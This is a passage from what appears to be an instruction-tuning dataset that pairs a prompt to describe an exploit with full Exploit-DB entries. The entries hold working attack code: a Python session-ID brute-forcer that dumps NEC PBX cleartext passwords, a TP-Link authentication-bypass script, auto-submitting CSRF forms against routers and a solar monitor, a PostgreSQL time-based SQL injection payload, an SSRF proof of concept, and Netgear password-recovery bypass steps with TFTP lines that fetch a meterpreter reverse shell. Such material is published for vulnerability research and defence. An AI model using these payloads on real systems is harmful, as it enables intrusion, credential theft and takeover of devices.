users\nglobal access to their control panels via any Internet browser accessed through a PC,\nPDA or Smartphone. In fact, the SmartLAN/G has an integrated web-server capable of\ndistinguishing the means of connection and as a result provides an appropriate web-page\nfor the tool in use. Smartphones can control the system in much the same way as a\nhousehold keypad, from inside the house or from any part of the world.\n\nDesc: Unauthenticated Server-Side Request Forgery (SSRF) vulnerability exists in the\nSmartLiving SmartLAN within the GetImage functionality. The application parses user\nsupplied data in the GET parameter 'host' to construct an image request to the service\nthrough onvif.cgi. Since no validation is carried out on the parameter, an attacker\ncan specify an external domain and force the application to make an HTTP request to\nan arbitrary destination host. This can be used by an external attacker for example\nto bypass firewalls and initiate a service and network enumeration on the internal\nnetwork through the affected application.\n\nTested on: GNU/Linux 3.2.1 armv5tejl\n           Boa/0.94.14rc21\n           BusyBox v1.20.2\n\n\nVulnerability discovered by Sipke Mellema\n                            @zeroscience\n\n\nAdvisory ID: ZSL-2019-5545\nAdvisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5545.php\n\n\nPoC:\n\ncurl http://192.168.1.17/cgi-bin/onvif.cgi -X POST -d\"mod=GetImage&host=http://127.0.0.1:23&par=2\""
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47738",
        "output": {
            "ID": "47738",
            "File": "exploits/hardware/webapps/47738.txt",
            "Description": "Intelbras Router RF1200 1.1.3 - Cross-Site Request Forgery",
            "Date Published": "2019-12-03",
            "Author": "Prof. Joas Antonio",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "80",
            "Date Added": "2019-12-03",
            "Date Updated": "2019-12-03",
            "Verified": "0",
            "Codes": [
                "CVE-2019-19516"
            ],
            "Tags": [
                "Cross-Site Request Forgery (CSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Intelbras Router RF1200 1.1.3 - Cross-Site Request Forgery \n# Date: 2019-11-06\n# Exploit Author: Joas Antonio\n# Vendor Homepage: intelbras.com.br\n# Software Link: https://www.intelbras.com/pt-br/roteador-wireless-smart-dual-band-action-rf-1200\n# Version: 1.1.3 (REQUIRED)\n# Tested on: Windows\n# CVE : CVE-2019-19516\n\n#POC1: \n<html>\n\t<body>\n\t\t<form method=\"POST\" action=\"http://IPROUTERRF1200/login/Auth\">\n\t\t\t<input type=\"hidden\" name=\"username\" value=\"admin\"/>\n\t\t\t<input type=\"hidden\" name=\"password\" value=\"21232f297a57a5a743894a0e4a801fc3\"/> <!-- password admin -->\n\t\t\t<input type=\"submit\" value=\"Submit\">\n\t\t</form>\n\t</body>\n<html>"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 45942",
        "output": {
            "ID": "45942",
            "File": "exploits/hardware/webapps/45942.py",
            "Description": "NEC Univerge Sv9100 WebPro - 6.00 - Predictable Session ID / Clear Text Password Storage",
            "Date Published": "2018-12-04",
            "Author": "hyp3rlinx",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "",
            "Date Added": "2018-12-04",
            "Date Updated": "2018-12-04",
            "Verified": "0",
            "Codes": [
                "CVE-2018-11742;CVE-2018-11741"
            ],
            "Tags": [
                "Authentication Bypass / Credentials Bypass (AB/CB)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "'''\n[+] Credits: hyp3rlinx\n[+] Website: hyp3rlinx.altervista.org\n[+] Source:  http://hyp3rlinx.altervista.org/advisories/NEC-UNIVERGE-WEBPRO-v6.00-PREDICTABLE-SESSIONID-CLEARTEXT-PASSWORDS.txt\n[+] ISR: ApparitionSec   \n\n\n***Greetz: indoushka | Eduardo B. 0day***\n\n\n[Vendor]\nwww.necam.com\n\n\n[Affected Product Code Base]\nNEC Univerge Sv9100 WebPro - 6.00.00\n\n\nNEC Univerge WebPro, is a web-based programming tool for the NEC Switch, which is used to program corporate Telephone systems.\n\n\nPublic facing installations as of Dec 1, 2018\nhttps://www.shodan.io/search?query=Server+Henry\nResult: 7,797 \n\n\n[Vulnerability Type(s)]\n[CVE Reference(s)]\nPredictable Session ID - CVE-2018-11741 / Cleartext Password Storage - CVE-2018-11742\n\n\n[Attack Vectors]\nMake repeated remote HTTP requests until arriving at a valid authenticated sessionId.\n\n\nSecurity Issue:\n================\nNEC Univerge WebPro suffers from a \"Predictable Session ID\" that can potentially disclose all user account information including passwords stored in clear text in the Web UI.\nAttackers can simply increment numbers until arriving at a live session, then by using a specific URI dump the entire account information for all users including the clear text passwords.\n\ne.g..\n\ncurl  http://NEC-VICTIM-IP/Home.htm?sessionId=12959&GOTO(8)\n\n\nExploit/POC:\n=============\n'''\n\nfrom socket import *\nimport re\n\n#Univerge Sv9100 NEC WebPro : 6.00\n#Dumps user accounts and plaintext passwords stored in Web UI in Administrator Programming Password Setup' webpage\n#http://TARGET-IP/Home.htm?sessionId=12959&GOTO(8) \"GOTO(8)\" will retrieve all account usernames and cleartext passwords.\n\nprint \"NEC Univerge Sv9100 WebPro - 6.00.00 / Remote 0day Exploit POC\"\nprint \"hyp3rlinx\"\n\n\nIP=raw_input(\"[+] TARGET> \")\nres=''\nfindme=\"Programming Password Setup\"\ncnt=0\ntmp=False\ntmp2=False\npwned=False\n\n#check application is NEC and vuln version\ndef is_NEC_webpro(u):\n    global tmp,tmp2,cnt\n    res=''\n    cnt+=1\n    s=socket(AF_INET, SOCK_STREAM)\n    s.connect((IP,80))\n    s.send('GET '+u+' HTTP/1.1\\r\\nHost: '+IP+'\\r\\n\\r\\n')\n\n    while True:\n        res=s.recv(4048)\n        if res.find('</html>')!=-1:\n            break   \n    s.close()\n    \n    if re.findall(r\"\\bWebPro\\b\", res):\n        tmp=True\n        if tmp and cnt < 3:\n            is_NEC_webpro('/Login.htm')\n            if re.findall(r\"\\b6.00.00\\b\", res) and re.findall(r\"\\bNEC Corporation of America\\b\", res):\n                tmp2 = True\n            if tmp == True and tmp2 == True:\n                return True\n    return False\n\n\n\ndef dump(acct):\n    file=open('NEC-Accounts.txt', 'w')\n    file.write(acct+'\\n')\n    file.close()\n\n\ndef breach(sid):\n    global pwned\n    try:\n        s=socket(AF_INET, SOCK_STREAM)\n        s.connect((IP,80))\n        sid=str(sid)\n        print 'trying sessid '+sid\n        s.send('GET /Home.htm?sessionId%3d'+sid+'&GOTO(8)%20HTTP/1.1\\r\\nHost: '+IP+'\\r\\n\\r\\n')\n    except Exception as e:\n        print str(e)\n        \n    while True:\n        res = s.recv(4096)\n        if res.find('</html>')!=-1:\n            break\n        if re.findall(r\"\\bProgramming Password Setup\\b\",res)!=-1: ## We hit an active session.\n            dump(res)\n            print res\n            pwned=True\n       \n    s.close()\n    return pwned\n\n\ndef sessgen():\n    for sessid in range(1000,15000): ##test 14109\n        if breach(sessid):\n            break\n\n\nif __name__=='__main__':\n    if is_NEC_webpro('/'):\n        sessgen()\n    else:\n        print 'Not NEC or version not vuln.'\n\n'''\nNetwork Access:\n===============\nRemote\n\n\nSeverity:\n=========\nHigh\n\n\nDisclosure Timeline:\n=============================\nVendor Notification:  May 15, 2018\nNo reply\nVendor Notification: May 18, 2018\nNo reply\nVendor Notification:  June 4, 2018\nNo reply\nMitre assign CVE: June 5, 2018\nJPCERT replies: June 6, 2018\nJPCERT shares information with NEC : June 7, 2018\nRequest status : August 11, 2018\nJPCERT contact NEC : August 14, 2018\nNo reply from vendor\nRequest status : August 21, 2018\nJPCERT again contacts NEC : August 21, 2018\nJPCERT \"vendor working on a release\" : August 23 2018\nJPCERT \"Vendor release October 2018\" : September 12, 2018\nNEC \"Requests public disclosure after December 1st.\" : November 19, 2018\nDecember 2, 2018 : Public Disclosure\n\n\n[+] Disclaimer\nThe information contained within this advisory is supplied \"as-is\" with no warranties or guarantees of fitness of use or otherwise.\nPermission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and\nthat due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit\nis given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility\nfor any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information\nor exploits by the author or elsewhere. All content (c).\n'''"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47117",
        "output": {
            "ID": "47117",
            "File": "exploits/hardware/webapps/47117.txt",
            "Description": "Netgear WiFi Router JWNR2010v5 / R6080 - Authentication Bypass",
            "Date Published": "2019-07-15",
            "Author": "Wadeek",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "",
            "Date Added": "2019-07-15",
            "Date Updated": "2019-07-16",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Authentication Bypass / Credentials Bypass (AB/CB)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: NETGEAR WiFi Router R6080 - Security Questions Answers Disclosure\n# Date: 13/07/2019\n# Exploit Author: Wadeek\n# Hardware Version: R6080-100PES\n# Firmware Version: 1.0.0.34 / 1.0.0.40\n# Vendor Homepage: https://www.netgear.com/support/product/R6080.aspx\n# Firmware Link: http://www.downloads.netgear.com/files/GDC/R6080/(R6080-V1.0.0.34.zip or R6080-V1.0.0.40.zip)\n\n== Files Containing Juicy Info ==\n>> http://192.168.1.1/currentsetting.htm\nFirmware=V1.0.0.34WW\nModel=R6080\n>> http://192.168.1.1:56688/rootDesc.xml (Server: Unspecified, UPnP/1.0, Unspecified)\n<serialNumber>SSSSSSSNNNNNN</serialNumber>\n\n== Security Questions Bypass > Answers Disclosure ==\n>> http://192.168.1.1/401_recovery.htm (SSSSSSSNNNNNN value for input)\n<POST REQUEST>\nhtpwd_recovery.cgi?id=XXXXXXXXXXXXXXX (one attempt because /tmp/SessionFile.*.htm)\n(replace)\ndev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=securityquestions.htm&SID=\n(by)\ndev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=PWD_password.htm&SID=\n<POST RESPONSE>\n<input type=\"text\" maxLength=\"64\" size=\"30\" name=\"answer1\" onFocus=\"this.select();\" value=\"AnSw3R-1\">\n<input type=\"text\" maxLength=\"64\" size=\"30\" name=\"answer2\" onFocus=\"this.select();\" value=\"AnSw3R-2\">\n(repeat recovery process for get admin password)\n\n== Authenticated Telnet Command Execution ==\n>> http://admin:Str0nG-!P4ssW0rD@192.168.1.1/setup.cgi?todo=debug\n:~$ telnet 192.168.1.1\nR6080 login: admin\nPassword: Str0nG-!P4ssW0rD\n{\nupload by TFTP # tftp -p -r [LOCAL-FILENAME] [IP] [PORT]\ndownload by TFTP # tftp -g -r [REMOTE-FILENAME_ELF_32-bit_LSB_executable_MIPS || linux/mipsle/meterpreter/reverse_tcp] [IP] [PORT]\n}\n\n\n\n# Exploit Title: NETGEAR WiFi Router JWNR2010v5 - Security Questions Answers Disclosure\n# Date: 13/07/2019\n# Exploit Author: Wadeek\n# Hardware Version: JWNR2010v5\n# Firmware Version: 1.1.0.54\n# Vendor Homepage: https://www.netgear.com/support/product/JWNR2010v5.aspx\n# Firmware Link: http://www.downloads.netgear.com/files/GDC/JNR1010V2/N300-V1.1.0.54_1.0.1.zip\n# Shodan Dork: \"HTTP/1.1 401 Unauthorized\" \"Set-Cookie: sessionid=\" \"NETGEAR JWNR2010v5\"\n\n== Files Containing Juicy Info ==\n>> http://192.168.1.1/currentsetting.htm\nFirmware=V1.1.0.54\nModel=JWNR2010v5\n>> http://192.168.1.1/BRS_netgear_success.html (Serial Number)\nsetTimeout('top.location.href = \"http://www.netgear.com/success/JWNR2010v5.aspx?sn=SSSSSSSNNNNNN\";',2000);\n\n== Security Questions Bypass > Answers Disclosure (only if \"Password Recovery\" is \"Enable\") ==\n>> http://192.168.1.1/401_recovery.htm (SSSSSSSNNNNNN value for input)\n<POST REQUEST>\nhtpwd_recovery.cgi?id=XXXXXXXXXXXXXXX (one attempt because /tmp/SessionFile.*.htm)\n(replace)\ndev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=securityquestions.htm&SID=\n(by)\ndev_serial=SSSSSSSNNNNNN&todo=verify_sn&this_file=401_recovery.htm&next_file=PWD_password.htm&SID=\n<POST RESPONSE>\n<input type=\"text\" maxLength=\"64\" size=\"30\" name=\"htpwd_answer1\" onFocus=\"this.select();\" value=\"AnSw3R-1\">\n<input type=\"text\" maxLength=\"64\" size=\"30\" name=\"htpwd_answer2\" onFocus=\"this.select();\" value=\"AnSw3R-2\">\n(repeat recovery process for get admin password)\n\n== Authenticated Telnet Command Execution ==\n>> http://admin:Str0nG-!P4ssW0rD@192.168.1.1/setup.cgi?todo=debug\n:~$ telnet 192.168.1.1\nJWNR2010v5 login: admin\nPassword: Str0nG-!P4ssW0rD\n{\nupload by TFTP # tftp -p -r [LOCAL-FILENAME] [IP] [PORT]\ndownload by TFTP # tftp -g -r [REMOTE-FILENAME_ELF_32-bit_LSB_executable_MIPS || linux/mipsle/meterpreter/reverse_tcp] [IP] [PORT]\n}"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 45937",
        "output": {
            "ID": "45937",
            "File": "exploits/hardware/webapps/45937.txt",
            "Description": "Rockwell Automation Allen-Bradley PowerMonitor 1000 - Incorrect Access Control Authentication Bypass",
            "Date Published": "2018-12-04",
            "Author": "Luca.Chiou",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "80",
            "Date Added": "2018-12-04",
            "Date Updated": "2018-12-04",
            "Verified": "0",
            "Codes": [
                "CVE-2018-19616"
            ],
            "Tags": [
                "Authentication Bypass / Credentials Bypass (AB/CB)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Rockwell Automation Allen-Bradley PowerMonitor 1000 - Incorrect Access Control\n# Date: 2018-11-27\n# Exploit Author: Luca.Chiou\n# Vendor Homepage: https://www.rockwellautomation.com/\n# Version: 1408-EM3A-ENT B\n# Tested on: It is a proprietary devices: https://ab.rockwellautomation.com/zh/Energy-Monitoring/1408-PowerMonitor-1000\n# CVE : CVE-2018-19616\n\n# 1. Description:\n# In Rockwell Automation Allen-Bradley PowerMonitor 1000 web page, there are a few buttons are disabled,\n# such as \u201cEdit\u201d, \u201cRemove\u201d, \u201cAddNew\u201d, \u201cChange Policy Holder\u201d and \u201cSecurity Configuration\u201d.\n# View the source code of login page, those buttons/functions just use the \u201cdisabled\u201d parameter to control the access right.\n# It is allow attackers using proxy to erase the \u201cdisabled\u201d parameter, and enable those buttons/functions.\n# Once those buttons/functions are enabled.\n# Attackers is capable to add a new user who have administrator right."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47480",
        "output": {
            "ID": "47480",
            "File": "exploits/hardware/webapps/47480.txt",
            "Description": "SMA Solar Technology AG Sunny WebBox device - 1.6 - Cross-Site Request Forgery",
            "Date Published": "2019-10-10",
            "Author": "Borja Merino",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "80",
            "Date Added": "2019-10-10",
            "Date Updated": "2019-10-10",
            "Verified": "0",
            "Codes": [
                "CVE-2019-13529"
            ],
            "Tags": [
                "Cross-Site Request Forgery (CSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: SMA Solar Technology AG Sunny WebBox device - 1.6 - Cross-Site Request Forgery\n# Date: 2019-10-08\n# Exploit Author: Borja Merino and Eduardo Villaverde\n# Vendor Homepage: https://www.sma.de\n# Version: Firmware Version 1.6 and prior\n# Tested on: Sunny WebBox SMA Solar Device (Firmware Version 1.6)\n# CVE : CVE-2019-13529\n# ICS-Cert Advisory: https://www.us-cert.gov/ics/advisories/icsa-19-281-01\n\n<!-- Change any hidden value -->\n\n<iframe style=\"display:none\" name=\"csrf-frame\"></iframe>\n<form method='POST' action='http://X.X.X.X/wb_network_changed.htm' target=\"csrf-frame\" id=\"csrf-form\">\n  <input type='hidden' name='RadioButtonDhcp' value='off'>\n  <input type='hidden' name='IpAddr' value='1.1.1.1'>\n  <input type='hidden' name='SubnetMask' value='255.255.255.0'>\n  <input type='hidden' name='Gateway' value='1.1.1.1'> \n  <input type='hidden' name='DnsIpAddr' value='5.5.5.1'>\n  <input type='hidden' name='Dns2IpAddr' value='5.5.5.2'>\n  <input type='hidden' name='StaticNatPortHttp' value='80'>\n  <input type='hidden' name='WebserverPort' value='80'>\n  <input type='hidden' name='WebservicePort' value='80'>\n  <input type='hidden' name='RadioButtonModbus' value='off'>\n  <input type='hidden' name='ModbusPort' value='502'>\n  <input type='hidden' name='BConfirm' value='Confirmar'>\n  <input type='submit' value='submit'>\n</form>\n<script>document.getElementById(\"csrf-form\").submit()</script>"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47595",
        "output": {
            "ID": "47595",
            "File": "exploits/hardware/webapps/47595.txt",
            "Description": "Smartwares HOME easy 1.0.9 - Client-Side Authentication Bypass",
            "Date Published": "2019-11-06",
            "Author": "LiquidWorm",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "",
            "Date Added": "2019-11-06",
            "Date Updated": "2019-11-06",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Authentication Bypass / Credentials Bypass (AB/CB)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Smartwares HOME easy 1.0.9 - Client-Side Authentication Bypass\n# Author: LiquidWorm\n# Date: 2019-11-05\n# Vendor: Smartwares\n# Product web page: https://www.smartwares.eu\n# Affected version: <=1.0.9\n# Advisory ID: ZSL-2019-5540\n# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5540.php\n# CVE: N/A\n\nSummary: Home Easy/Smartwares are a range of products designed to remotely\ncontrol your home using wireless technology. Home Easy/Smartwares is very\nsimple to set up and allows you to operate your electrical equipment like\nlighting, appliances, heating etc.\n\nDesc: HOME easy suffers from information disclosure and client-side authentication\nbypass vulnerability through IDOR by navigating to several administrative web pages.\nThis allowed disclosing an SQLite3 database file and location. Other functionalities\nare also accessible by disabling JavaScript in your browser, bypassing the client-side\nvalidation and redirection.\n\nTested on: Boa/0.94.13\n\n/web-en/task.html\n/web-en/action_task.html\n/web-en/plan_task.html\n/web-en/room.html\n/web-en/room_set.html\n/web-en/room_set2.html\n/web-en/scene.html\n/web-en/scene_set.html\n/web-en/scene_set2.html\n/web-en/system.html"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47483",
        "output": {
            "ID": "47483",
            "File": "exploits/hardware/webapps/47483.py",
            "Description": "TP-Link TL-WR1043ND 2 - Authentication Bypass",
            "Date Published": "2019-10-10",
            "Author": "Uriel Kosayev",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "80",
            "Date Added": "2019-10-10",
            "Date Updated": "2019-10-10",
            "Verified": "0",
            "Codes": [
                "CVE-2019-6971"
            ],
            "Tags": [
                "Authentication Bypass / Credentials Bypass (AB/CB)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: TP-Link TL-WR1043ND 2 - Authentication Bypass\n# Date: 2019-06-20\n# Exploit Author: Uriel Kosayev\n# Vendor Homepage: https://www.tp-link.com\n# Version: TL-WR1043ND V2\n# Tested on: TL-WR1043ND V2\n# CVE : CVE-2019-6971\n# CVE Link: https://nvd.nist.gov/vuln/detail/CVE-2019-6971\n\nimport requests\n\nascii = '''\n  __________        __    _       __  \n /_  __/ __ \\      / /   (_)___  / /__\n  / / / /_/ /_____/ /   / / __ \\/ //_/\n / / / ____/_____/ /___/ / / / / ,<   \n/_/ /_/         /_____/_/_/ /_/_/|_|  \n\n'''\nprint(ascii)\nDefault_Gateway = raw_input(\"Enter your TP-Link router IP: \")\n\n# Constants\nurl = 'http://'\nurl2 = '/userRpm/LoginRpm.htm?Save=Save'\nfull = url + Default_Gateway + url2\n# full = str(full)\n\n# The full GET request with the cookie authorization hijacked\nreq_header = {\n    'Host': '{}'.format(Default_Gateway),\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n    'Accept-Language': 'en-US,en;q=0.5',\n    'Accept-Encoding': 'gzip, deflate',\n    'Referer': 'http://{}/userRpm/LoginRpm.htm?Save=Save'.format(Default_Gateway),\n    'Connection': 'close',\n    'Cookie': '''Authorization=Basic%20QWRtaW5pc3RyYXRvcjpjM2JiNTI5NjdiNjVjYWY4ZWRkMWNiYjg4ZDcwYzYxMQ%3D%3D''',\n    'Upgrade-Insecure-Requests': '1'\n}\n\ntry:\n    response = requests.get(full, headers=req_header).content\nexcept requests.exceptions.ConnectionError:\n    print(\"Enter a valid Default Gateway IP address\\nExiting...\")\n    exit()\ngenerate = response.split('/')[3] # Gets the randomized URL \"session ID\"\n\n\noption_1 = input(\"Press 1 to check if your TP-Link router is vulnerable: \")\n\nif option_1 is 1:\n\n    if generate in response:\n        print('Vulnerable!\\n')\n        option_2 = input('Press 2 if you want to change the router\\'s SSID or any other key to quit: ')\n        if option_2 is 2:\n            newssid = raw_input('New name: ')\n            ssid_url = '/userRpm/WlanNetworkRpm.htm?ssid1={}&ssid2=TP-LINK_660A_2&ssid3=TP-LINK_660A_3&ssid4=TP-LINK_660A_4&region=43&band=0&mode=5&chanWidth=2&channel=1&rate=83&speedboost=2&broadcast=2&brlssid=&brlbssid=&addrType=1&keytype=1&wepindex=1&authtype=1&keytext=&Save=Save'.format(\n                newssid)\n            changessid_full = url + Default_Gateway + '/' + generate + ssid_url\n            requests.get(changessid_full, headers=req_header)\n            print('Changed to: {}'.format(newssid))\n        else:\n            (\"Please choose the correct option.\\nExiting...\")\n            exit()\n    else:\n        print('Not Vulnerable')\n        exit()\nelse:\n    print(\"Please choose the correct option.\\nExiting...\")\n    exit()"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47949",
        "output": {
            "ID": "47949",
            "File": "exploits/java/webapps/47949.txt",
            "Description": "ManageEngine Network Configuration Manager 12.2 - 'apiKey' SQL Injection",
            "Date Published": "2020-01-21",
            "Author": "Ertebat Gostar Co",
            "Type": "webapps",
            "Platform": "java",
            "Port": "80",
            "Date Added": "2020-01-21",
            "Date Updated": "2020-01-28",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: ManageEngine Network Configuration Manager 12.2 - 'apiKey' SQL Injection\n# discovery Date: 2019-01-24\n# published : 2020-01-20\n# Exploit Author: AmirHadi Yazdani\n# Vendor Homepage: https://www.manageengine.com/network-configuration-manager/\n# Software Link: https://www.manageengine.com/network-configuration-manager/\n# Demo: http://demo.networkconfigurationmanager.com\n# Version: <= Build Version  : 12.2\n# Tested on: win 2012 R2\n------------\nAbout ManageEngine Network Configuration Manager(NCM) (From Vendor Site) :     \n                                \nNetwork Configuration Manager is a multi vendor network change,\nconfiguration and compliance management (NCCCM) solution for switches, routers, firewalls and other network devices.\nNCM helps automate and take total control of the entire life cycle of device configuration management.\n--------------------------------------------------------\n\nExploit POC :\n\n# Parameter: apiKey (GET)\n# Title: PostgreSQL Time Based Blind\n# Vector: AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))\n\n#Payload:  \nhttp://127.0.0.1/api/json/dashboard/getOverviewList?apiKey=1 AND 1398=(SELECT COUNT(*) FROM GENERATE_SERIES(1,3000000))&TimeFrame=hourly&_=1483732552930\n\n--------------------------"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 42034",
        "output": {
            "ID": "42034",
            "File": "exploits/java/webapps/42034.txt",
            "Description": "Oracle PeopleSoft - Server-Side Request Forgery",
            "Date Published": "2017-05-19",
            "Author": "ERPScan",
            "Type": "webapps",
            "Platform": "java",
            "Port": "",
            "Date Added": "2017-05-19",
            "Date Updated": "2017-05-19",
            "Verified": "0",
            "Codes": [
                "CVE-2017-3546"
            ],
            "Tags": [
                "Server-Side Request Forgery (SSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Application: Oracle PeopleSoft\nVersions Affected: ToolsRelease: 8.55.03; ToolsReleaseDB: 8.55;\nPeopleSoft HCM 9.2\nVendor URL: http://oracle.com\nBugs: SSRF\nReported: 23.12.2016\nVendor response: 24.12.2016\nDate of Public Advisory: 18.04.2017\nReference: Oracle CPU April 2017\nAuthor: Roman Shalymov (ERPScan)\n\nDescription\n\n1. ADVISORY INFORMATION\n\nTitle:[ERPSCAN-17-022] SSRF in PeopleSoft IMServlet\nAdvisory ID: [ERPSCAN-17-022]\nRisk: high\nCVE: CVE-2017-3546\nAdvisory URL: https://erpscan.com/advisories/erpscan-17-022-ssrf-peoplesoft-imservlet/\nDate published: 18.04.2017\nVendors contacted: Oracle\n\n\n2. VULNERABILITY INFORMATION\n\nClass: SSRF\nImpact: cross-site port attack, service enumeration\nRemotely Exploitable: yes\nLocally Exploitable: yes\n\nCVSS Information\n\nCVSS Base Score v3:    8.0 / 10\nCVSS Base Vector:\nAV : Attack Vector (Related exploit range) Network (N)\nAC : Attack Complexity (Required attack complexity) High (H)\nPR : Privileges Required (Level of privileges needed to exploit) High (H)\nUI : User Interaction (Required user participation) None (N)\nS : Scope (Change in scope due to impact caused to components beyond\nthe vulnerable component) Changed (C)\nC : Impact to Confidentiality High (H)\nI : Impact to Integrity High (H)\nA : Impact to Availability High (H)\n\n\n3. VULNERABILITY DESCRIPTION\n\nAn attacker can force a vulnerable server to trigger malicious\nrequests to third-party servers or to internal resources. This\nvulnerability can then be leveraged to launch specific attacks such as\na cross-site port attack, service enumeration, and various other\nattacks.\n\n4. VULNERABLE PACKAGES\n\nToolsRelease: 8.55.03\nToolsReleaseDB: 8.55\nPeopleSoft HCM 9.2\n\n5. SOLUTIONS AND WORKAROUNDS\n\nTo correct this vulnerability, implement Oracle CPU April 2017\n\n6. AUTHOR\n\nRoman Shalymov\n\n7. TECHNICAL DESCRIPTION\n\nPoC\n\nRun netcat\n\n1. nc -l -p # on some host\n\nIn browser open the following links\n\nhttp://PPLSOFTSRV:8000/IMServlet?Method=CONNECT\n\nhttp://PPLSOFTSRV::8000/IMServlet?Method=GOOGLE_PRESENCE&im_to_user=abc&im_server_name=GOOGLE&im_server=SOMEHOST:OPEN_PORT/?param=var%23\"\n\n\nRead response in netcat\n\nGET /?param=var HTTP/1.1\n\nUser-Agent: Java1.7.0_95\n\nHost: SOMEHOST:OPEN_PORT\n\nAccept: text/html, image/gif, image/jpeg, /; q=.2\n\nConnection: Keep-Alive\n\n\n8. ABOUT ERPScan Research\n\nERPScan research team specializes in vulnerability research and\nanalysis of critical enterprise applications. It was acknowledged\nmultiple times by the largest software vendors like SAP, Oracle,\nMicrosoft, IBM, VMware, HP for discovering more than 400\nvulnerabilities in their solutions (200 of them just in SAP!).\n\nERPScan researchers are proud of discovering new types of\nvulnerabilities (TOP 10 Web Hacking Techniques 2012) and of the \"The\nBest Server-Side Bug\" nomination at BlackHat 2013.\n\nERPScan experts participated as speakers, presenters, and trainers at\n60+ prime international security conferences in 25+ countries across\nthe continents ( e.g. BlackHat, RSA, HITB) and conducted private\ntrainings for several Fortune 2000 companies.\n\nERPScan researchers carry out the EAS-SEC project that is focused on\nenterprise application security awareness by issuing annual SAP\nsecurity researches.\n\nERPScan experts were interviewed in specialized info-sec resources and\nfeatured in major media worldwide. Among them there are Reuters,\nYahoo, SC Magazine, The Register, CIO, PC World, DarkReading, Heise,\nChinabyte, etc.\n\nOur team consists of highly-qualified researchers, specialized in\nvarious fields of cybersecurity (from web application to ICS/SCADA\nsystems), gathering their experience to conduct the best SAP security\nresearch.\n\n9. ABOUT ERPScan\n\nERPScan is the most respected and credible Business Application\nCybersecurity provider. Founded in 2010, the company operates globally\nand enables large Oil and Gas, Financial, Retail and other\norganizations to secure their mission-critical processes. Named as an\n\u2018Emerging Vendor\u2019 in Security by CRN, listed among \u201cTOP 100 SAP\nSolution providers\u201d and distinguished by 30+ other awards, ERPScan is\nthe leading SAP SE partner in discovering and resolving security\nvulnerabilities. ERPScan consultants work with SAP SE in Walldorf to\nassist in improving the security of their latest solutions.\n\nERPScan\u2019s primary mission is to close the gap between technical and\nbusiness security, and provide solutions for CISO's to evaluate and\nsecure SAP and Oracle ERP systems and business-critical applications\nfrom both cyberattacks and internal fraud. As a rule, our clients are\nlarge enterprises, Fortune 2000 companies and MSPs, whose requirements\nare to actively monitor and manage security of vast SAP and Oracle\nlandscapes on a global scale.\n\nWe \u2018follow the sun\u2019 and have two hubs, located in Palo Alto and\nAmsterdam, to provide threat intelligence services, continuous support\nand to operate local offices and partner network spanning 20+\ncountries around the globe."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47762",
        "output": {
            "ID": "47762",
            "File": "exploits/java/webapps/47762.txt",
            "Description": "Oracle Siebel Sales 8.1 - Persistent Cross-Site Scripting",
            "Date Published": "2019-12-09",
            "Author": "omurugur",
            "Type": "webapps",
            "Platform": "java",
            "Port": "",
